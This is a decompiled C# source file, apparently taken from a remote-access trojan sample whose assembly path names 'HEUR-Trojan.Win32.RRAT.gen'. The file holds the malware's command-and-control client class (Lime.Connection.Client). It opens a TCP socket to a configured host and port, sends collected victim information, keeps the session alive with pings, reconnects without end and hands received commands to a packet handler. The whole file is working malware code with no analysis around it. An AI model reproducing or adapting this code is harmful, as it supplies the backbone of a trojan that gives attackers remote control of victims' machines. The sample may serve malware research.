// Decompiled with JetBrains decompiler
// Type: Lime.Connection.Client
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B7B9751B-0E50-4E11-A73D-EB218010FF7C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.RRAT.gen-f6b2c58f9846adcb295edd3c8a5beaec31fff3bc98f6503d04e95be3f9f072e8.exe

using Lime.Helper;
using Lime.Packets;
using Lime.Settings;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace Lime.Connection
{
  public static class Client
  {
    private static Socket client;
    public static bool isConnected;
    private static MemoryStream memoryStream;
    private static Timer keepAlivePacket;

    public static void Run() => new Thread(new ThreadStart(Client.TcpReceive)).Start();

    private static void TcpReceive()
    {
label_10:
      while (!Client.isConnected)
      {
        try
        {
          if (Client.memoryStream != null)
            Client.memoryStream.Dispose();
          if (Client.keepAlivePacket != null)
            Client.keepAlivePacket.Dispose();
        }
        catch
        {
        }
        try
        {
          Client.client.Disconnect(false);
        }
        catch
        {
        }
        try
        {
          Client.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          Client.client.SendBufferSize = 999999;
          Client.client.ReceiveBufferSize = 999999;
          Client.client.Connect(Config.host, Convert.ToInt32(Config.port));
          Client.isConnected = true;
          Client.TcpSend(IdGenerator.SendInfo());
          Client.keepAlivePacket = new Timer(new TimerCallback(Client.Ping), (object) null, 30000, 30000);
          Client.memoryStream = new MemoryStream();
        }
        catch
        {
          Client.isConnected = false;
          Thread.Sleep(3000);
        }
      }
label_18:
      while (Client.isConnected)
      {
        try
        {
          if (Client.client.Poll(-1, SelectMode.SelectRead) && Client.client.Available <= 0 || !Client.client.Connected)
          {
            Client.isConnected = false;
            break;
          }
          byte[] buffer = new byte[Client.client.Available];
          Client.client.Receive(buffer, 0, buffer.Length, SocketFlags.None);
          Client.memoryStream.Write(buffer, 0, buffer.Length);
          while (true)
          {
            if (StringConverter.BytestoString(Client.memoryStream.ToArray()).Contains(Config.splitter))
            {
              Array[] arrayArray = (Array[]) Client.PacketFixer(Client.memoryStream.ToArray(), Config.splitter);
              new Thread(new ParameterizedThreadStart(new PacketHandler().Handler)).Start((object) arrayArray[0]);
              Client.memoryStream.Dispose();
              Client.memoryStream = new MemoryStream();
              if (arrayArray.Length == 2)
                Client.memoryStream.Write((byte[]) arrayArray[1], 0, ((byte[]) arrayArray[1]).Length);
              else
                goto label_18;
            }
            else
              goto label_18;
          }
        }
        catch
        {
          Client.isConnected = false;
          break;
        }
      }
      goto label_10;
    }

    private static void Ping(object state)
    {
      Client.TcpSend(StringConverter.StringToBytes("keepAlivePing!"));
      GC.Collect();
      GC.WaitForPendingFinalizers();
      GC.Collect();
    }

    private static void TcpSend(byte[] packet)
    {
      if (!Client.isConnected)
        return;
      try
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          memoryStream.Write(packet, 0, packet.Length);
          memoryStream.Write(StringConverter.StringToBytes(Config.splitter), 0, Config.splitter.Length);
          Client.client.SendBufferSize = packet.Length;
          Client.client.Poll(-1, SelectMode.SelectWrite);
          Client.client.Send(memoryStream.ToArray(), 0, (int) memoryStream.Length, SocketFlags.None);
        }
      }
      catch
      {
        Client.isConnected = false;
      }
    }

    public static void TcpSend(string S) => Client.TcpSend(StringConverter.StringToBytes(S));

    private static Array PacketFixer(byte[] bytesArray, string splitter)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      string[] strArray = Strings.Split(StringConverter.BytestoString(bytesArray), splitter, Compare: CompareMethod.Text);
      memoryStream1.Write(bytesArray, 0, strArray[0].Length);
      memoryStream2.Write(bytesArray, strArray[0].Length + splitter.Length, bytesArray.Length - (strArray[0].Length + splitter.Length));
      numArrayList.Add(memoryStream1.ToArray());
      numArrayList.Add(memoryStream2.ToArray());
      memoryStream1.Dispose();
      memoryStream2.Dispose();
      return (Array) numArrayList.ToArray();
    }
  }
}
